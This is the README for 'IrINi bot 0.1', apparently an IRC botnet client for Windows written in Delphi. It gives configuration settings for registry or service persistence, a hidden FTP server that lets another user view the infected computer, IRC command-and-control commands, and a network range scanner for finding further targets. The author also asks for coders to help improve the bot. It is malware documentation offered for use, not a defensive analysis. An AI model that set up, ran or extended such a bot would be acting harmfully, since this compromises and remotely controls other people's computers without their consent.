--------------------------------------------------------------------------
IrINi bot 0.1 public limited version for win32
--------------------------------------------------------------------------
* codded in delphi 7 by Morpheus
  Tested: winxp sp2,win2k sp4.
--------------------------------------------------------------------------
Redistribution and use in binary forms, with or without modification,
are permitted provided that the following conditions are met:
1. The name of the author may not be used to endorse or promote products
   derived from this software without specific prior written permission.
2. The binary may not be sold and/or given away for free.
3. The licensee may only create binaries for his own usage, not for any
   third parties.

Redistribution and use in source forms, with or without modification,
are not permitted.
--------------------------------------------------------------------------
Please do not steal source without authorization, this is one of few first bot source`s for delphi.
--------------------------------------------------------------------------

- this version for bot first testing, please test out the scanner  - scan options, send commets & logs to darkerclone@hotmail.com

In order to setup bot, edit InitConfig in InitConfig.pas - you will need delphi 7 installed

BOT_NICK_PREFIX:='Mama'; // nickprefix 
BOT_CHANNAL:='#joinhere'; // channal join to:
BOT_COMMAND_PREFIX:='!'; // command prefix 
BOT_As_Service:=false; // run as service
BOT_As_Reg:=true; // install reg
BOT_Service_Name:='IDF'; service name
BOT_Service_Info:='Test Service'; service info
SCAN_TimeOut:=1; // 1000ms // scanner timeout 
BOT_LOOKUPADRESSS:=TRUE; // lookup for up address . userhost
FTP_User:='Test';  // ftp user - bot has its own ftp server to trasfer files, but you have another user that can view the computer.
FTP_Pass:='Test';  // ftp pass

Basic commands:
!login
!whoami - display ip, rundir
!ftp - gives remote and lock ip + port.
!scan ( eg .scan -i 192.168.2.0 192.168.2.50 50 ) 50 threads.

{
  MPS (Muilti Port / range Scanner By morpheus (Beta test)
  Scanner paramters:
  -s | shut down
  -a | add range to list
  -p | print range list
  -c | clear the list
  -d | remove a range from the list
  -l | scan the lan
  -i | scan a range
  -f | scan from host lists
  -h | scan an host
  -r | scan random range
}

--------------------------------------------------------------------------
- i need talented delphi coders to help improve that bot, contact me!
--------------------------------------------------------------------------

EOF


